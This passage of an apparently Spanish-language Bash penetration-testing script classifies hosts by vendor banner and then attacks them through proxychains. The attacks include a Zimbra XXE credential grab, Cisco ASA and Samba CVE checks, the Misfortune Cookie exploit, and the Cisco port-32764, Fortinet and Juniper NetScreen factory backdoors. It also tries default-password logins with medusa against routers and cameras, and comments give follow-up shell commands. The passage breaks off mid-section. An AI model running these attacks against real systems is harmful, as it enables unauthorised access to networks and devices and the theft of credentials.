	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/fortinet2.txt
	sort ../servicios/fortinet2.txt | uniq > ../servicios/fortinet.txt
	rm ../servicios/fortinet2.txt
	
	#3com
	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
	rm ../servicios/3com2.txt
	
	#d-link
	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
	rm ../servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
	rm ../servicios/linksys2.txt
		
	
	#Pentahoo	
	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
	
	#Dahua Camera
	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
	
	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt	
	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
	
	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt
	
	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt
	
	#ZKsoftware
	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt		

	#vCenter
	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt
	
	
	#Cisco
	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" |  cut -d "_" -f1 | uniq >> ../servicios/cisco.txt
	
	#ZTE
	grep --color=never -i ZTE * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZTE2.txt
	sort ../servicios/ZTE2.txt | uniq > ../servicios/ZTE.txt ; rm ../servicios/ZTE2.txt
		
	
	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt
	
	#jboss
	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt
	
	#401
		#line = http://200.87.193.109:80/phpmyadmin/	
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../servicios/web401-2.txt
		#line=10.0.0.2:443
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
	# sort
	sort ../servicios/web401-2.txt | uniq | uniq >> ../servicios/web401.txt
	rm ../servicios/web401-2.txt
	
cd ..
################################
# FASE 4
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null

# UPNP
if [ -f servicios/upnp.txt ]
then

	if [ $internet == "s" ]; then 			
		echo -e "$OKBLUE #################### UPnP (`wc -l servicios/upnp.txt`) ######################$RESET"
		for ip in $(cat servicios/upnp.txt); do		
			echo -e "[+] Escaneando $ip:1900"		
			echo "upnp_info.py $ip"  >> logs/vulnerabilidades/"$ip"_1900_upnpAbierto.txt 2>/dev/null
			$proxychains upnp_info.py $ip  >> logs/vulnerabilidades/"$ip"_1900_upnpAbierto.txt 2>/dev/null
			cp logs/vulnerabilidades/"$ip"_1900_upnpAbierto.txt 2>/dev/null .vulnerabilidades/"$ip"_1900_upnpAbierto.txt
		done
	
	
		# revisar si hay scripts ejecutandose
		while true; do
		upnp_instancias=`ps aux | egrep 'upnp_info.py' | wc -l`		
		if [ "$upnp_instancias" -gt 1 ]
		then
			echo -e "\t[i] Todavia hay scripts activos ($upnp_instancias)"				
			sleep 10
			else
				break		
			fi
		done	# done true		
	
		# Revisar si se detecto servicios upnp
		for ip in $(cat servicios/upnp.txt); do			
					
			egrep -iq "http" logs/vulnerabilidades/"$ip"_1900_upnpEnum.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKRED[!] Servicio upnp descubierto \n $RESET"
				cp logs/vulnerabilidades/"$ip"_1900_upnpEnum.txt .vulnerabilidades/"$ip"_1900_upnpEnum.txt
			fi														
		done		
	
		#insert clean data	
		insert_data	
	
	fi # escaneo desde internet
				
fi


#zimbra
if [ -f servicios/zimbra.txt ]
then
	echo -e "$OKBLUE #################### zimbra (`wc -l servicios/zimbra.txt`) ######################$RESET"	    	
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"	
		echo -e "\t[+]Probando vulnerabilidad XXE \n $RESET"				
		
		if [[ $port -eq 80 ]] ; then					
			echo "hackWeb.pl -t $ip -p $port -m zimbraXXE -s 0 " > logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null		
			$proxychains hackWeb.pl -t $ip -p $port -m zimbraXXE -s 0  >> logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null		
		else
		
			echo "hackWeb.pl -t $ip -p $port -m zimbraXXE -s 1 " > logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null		
			$proxychains hackWeb.pl -t $ip -p $port -m zimbraXXE -s 1  >> logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 2>/dev/null
		fi		
		
		grep -i "credenciales" logs/vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt  > .vulnerabilidades/"$ip"_"$port"_zimbraXXE.txt 															
		 echo ""
 	done <servicios/zimbra.txt
	#insert clean data	
	insert_data	
fi


#cisco
if [ -f servicios/ciscoASA.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l servicios/ciscoASA.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:443"		
		echo -e "\t[+]Probando vulnerabilidad de Cisco ASA \n $RESET"
		echo "$proxychains  nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip" > logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
		$proxychains nmap -n -sT -Pn  -p 443 --script http-vuln-cve2014-2128 $ip >> logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt 2>/dev/null		
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_ciscoASAVuln.txt
		
#		nmap -n -sT -Pn  -p 443 --script http_vuln-cve2014-2129 $ip > logs/vulnerabilidades/"$ip"_cisco-dos.txt 2>/dev/null		
		#grep --color=never "|" logs/vulnerabilidades/"$ip"_cisco-dos.txt  > .vulnerabilidades/"$ip"_cisco-dos.txt
													 
		 echo ""
 	done <servicios/ciscoASA.txt
	#insert clean data	
	insert_data	
fi

#cisco
if [ -f servicios/cisco.txt ]
then
	echo -e "$OKBLUE #################### cisco (`wc -l servicios/cisco.txt`) ######################$RESET"	    
	while read line       
	do     						
		echo -e "[+] Escaneando $line"
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			echo "medusa -h $ip -u admin -p admin -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			
			respuesta=`grep "SUCCESS" logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Cisco] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			fi				
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			
			echo "medusa -h $ip -u admin -p admin -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt			
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null	
			
			respuesta=`grep "SUCCESS" logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Cisco] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			fi					
		fi								
		echo ""													 		
 	done <servicios/cisco.txt
	#insert clean data	
	insert_data	
fi


#samba
if [ -f servicios/samba.txt ]
then
	echo -e "$OKBLUE #################### samba (`wc -l servicios/samba.txt`) ######################$RESET"	    
	while read ip       
	do     						
		echo -e "[+] Escaneando $ip:445"		
		echo "$proxychains  nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip" > logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
		$proxychains nmap -n -sT -Pn --script smb-vuln-cve-2017-7494 -p 445 $ip >> logs/vulnerabilidades/"$ip"_445_sambaVuln.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambaVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_445_sambaVuln.txt

		echo -e "\t[+] Obteniendo version de samba"
		$proxychains msfconsole -x "use auxiliary/scanner/smb/smb_version;set RHOSTS $ip; exploit;exit" >> logs/enumeracion/"$ip"_samba_version.txt 2>/dev/null
		grep "Samba" logs/enumeracion/"$ip"_samba_version.txt | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .banners/"$ip"_samba_version.txt 

		
		#scanner/smb/smb_uninit_cred											 
		 echo ""
 	done <servicios/samba.txt
	#insert clean data	
	insert_data	
fi

#RomPager
if [ -f servicios/RomPager.txt ]
then
	echo -e "$OKBLUE #################### RomPager (`wc -l servicios/RomPager.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip:80"	
		echo "misfortune_cookie.pl -target $ip -port 80" > logs/vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
		$proxychains misfortune_cookie.pl -target $ip -port 80 >> logs/vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
		grep --color=never "bimqODoXWaTzdFnh" logs/vulnerabilidades/"$ip"_80_misfortune.txt > .vulnerabilidades/"$ip"_80_misfortune.txt 2>/dev/null 
													 
		 echo ""
 	done <servicios/RomPager.txt
	#insert clean data	
	insert_data	
	
	#exploit 
	#use auxiliary/admin/http/allegro_rompager_auth_bypass
fi


# cisco backdoor

if [ -f servicios/backdoor32764.txt ]
then
	echo -e "$OKBLUE #################### Cisco linksys WAG200G backdoor (`wc -l servicios/backdoor32764.txt`) ######################$RESET"	    
	while read line     
	do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	 						
		echo -e "[+] Escaneando $ip:32764"	
		echo "backdoor32764.py --ip $ip" > logs/vulnerabilidades/"$ip"_32764_backdoorFabrica.txt 2>/dev/null		  
		$proxychains backdoor32764.py --ip $ip >> logs/vulnerabilidades/"$ip"_32764_backdoorFabrica.txt 2>/dev/null		  
		respuesta=`grep "is vulnerable" logs/vulnerabilidades/"$ip"_32764_backdoorFabrica.txt`
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then
			echo -n "[Cisco linksys WAG200G] $respuesta" >> .vulnerabilidades/"$ip"_32764_backdoorFabrica.txt
		fi
		# exploit		
		# backdoor32764.py --ip 192.168.0.1 --shell

		 echo ""
 	done <servicios/backdoor32764.txt
	#insert clean data	
	insert_data	
fi


# fortigate backdoor

if [ -f servicios/fortinet.txt ]
then
	echo -e "$OKBLUE #################### fortinet (`wc -l servicios/fortinet.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"		
		
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			echo -e "\n medusa -e n -u admin -h $ip -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			
			echo -e "\n medusa -h $ip -u maintainer -p admin -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u maintainer -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			
			respuesta=`grep "SUCCESS" logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Fortinet] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi
		fi	
					
		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			echo -e "\n medusa -e n -u admin -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			
			echo -e "\n medusa -h $ip -u maintainer -p admin -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u maintainer -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			
			respuesta=`grep "SUCCESS" logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Fortinet] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
			
			
			echo "$proxychains msfconsole -x \"use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;exploit;exit\"" > logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
			$proxychains msfconsole -x "use auxiliary/scanner/ssh/fortinet_backdoor;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null		
			sleep 1
			
			respuesta=`grep --color=never Logged logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Fortinet] $respuesta" >> .vulnerabilidades/"$ip"_22_backdoorFabrica.txt
			fi
		fi					
						
		 echo ""
 	done <servicios/fortinet.txt
	#exploit 
	# cd /opt/backdoors/
	# python fortigate.py 192.168.0.1
	
	#insert clean data	
	insert_data	
fi

# Juniper 
if [ -f servicios/NetScreen.txt ]
then
	echo -e "$OKBLUE #################### NetScreen - Juniper (`wc -l servicios/NetScreen.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"
		
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"			
			echo -e "\n medusa -h $ip -u admin -p abc123 -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p abc123 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			
			echo -e "\n medusa -h $ip -u super -p juniper123 -M telnet" >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null						
			$proxychains medusa -h $ip -u super -p juniper123 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null						
			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Juniper] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt 
			fi
			
			echo "medusa -u admin -p <<< %s(un='%s') = %u -h $ip -M telnet" >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			
			echo -e "\n medusa -u root -p <<< %s(un='%s') = %u -h $ip -M telnet" >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			
			echo -e "\n medusa -u netscreen -p <<< %s(un='%s') = %u -h $ip -M telnet" >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt 2>/dev/null
			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_backdoorFabrica.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Juniper] $respuesta" >> .vulnerabilidades/"$ip"_23_backdoorFabrica.txt 
			fi

		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			echo -e "\n medusa -h $ip -u admin -p abc123 -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p abc123 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			
			echo -e "\n medusa -h $ip -u super -p juniper123 -M ssh" >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u super -p juniper123 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Juniper] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
			
			
			echo -e "\n medusa -u admin -p <<< %s(un='%s') = %u -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u admin -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			
			echo -e "\n medusa -u root -p <<< %s(un='%s') = %u -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u root -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			
			echo -e "\n medusa -u netscreen -p <<< %s(un='%s') = %u -h $ip -M ssh" >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			$proxychains medusa -u netscreen -p "\"<<< %s(un='%s') = %u\"" -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt 2>/dev/null
			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_backdoorFabrica.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Juniper] $respuesta" >> .vulnerabilidades/"$ip"_22_backdoorFabrica.txt
			fi
		fi					
					
		
		echo ""
 	done <servicios/NetScreen.txt
	#exploit 
	# ssh root@192.168.0.1  pass=<<< %s(un='%s') = %u	
	#insert clean data	
	insert_data
fi

# zyxel default password
if [ -f servicios/zyxel.txt ]
then
	echo -e "$OKBLUE #################### zyxel (`wc -l servicios/zyxel.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p user -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null					
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Zyxel] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi
			
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p user -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Zyxel] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
									
		echo ""
 	done <servicios/zyxel.txt	
	insert_data
fi


# mikrotik default password
if [ -f servicios/mikrotik.txt ]
then
	echo -e "$OKBLUE #################### mikrotik (`wc -l servicios/mikrotik.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Mikrotik] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi
			
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Mikrotik] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
						
		echo ""
 	done <servicios/mikrotik.txt	
	insert_data
fi

# ubiquiti default password
if [ -f servicios/ubiquiti.txt ]
then
	echo -e "$OKBLUE #################### ubiquiti (`wc -l servicios/ubiquiti.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p ubnt -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u ubnt -p ubnt -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Ubiquiti] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi								
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p ubnt -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u ubnt -p ubnt -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Ubiquiti] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
						
		echo ""
 	done <servicios/ubiquiti.txt	
	insert_data
fi


# dahua default password
if [ -f servicios/dahua.txt ]
then
	echo -e "$OKBLUE #################### dahua (`wc -l servicios/dahua.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
			echo -e "\t[+] Probando password por defecto"
			echo "medusa -u root -p vizxv -h $ip -M telnet" > logs/vulnerabilidades/"$ip"_23_passwordDahua.txt 2>/dev/null
			$proxychains medusa -u root -p vizxv -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDahua.txt 2>/dev/null			
			grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDahua.txt > .vulnerabilidades/"$ip"_23_passwordDahua.txt 					
			#grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_password.txt 2>/dev/null > .vulnerabilidades/"$ip"_23_password.txt		
 	done <servicios/dahua.txt	
	insert_data
fi


# dahua web default password
if [ -f servicios/dahua_camara.txt ]
then
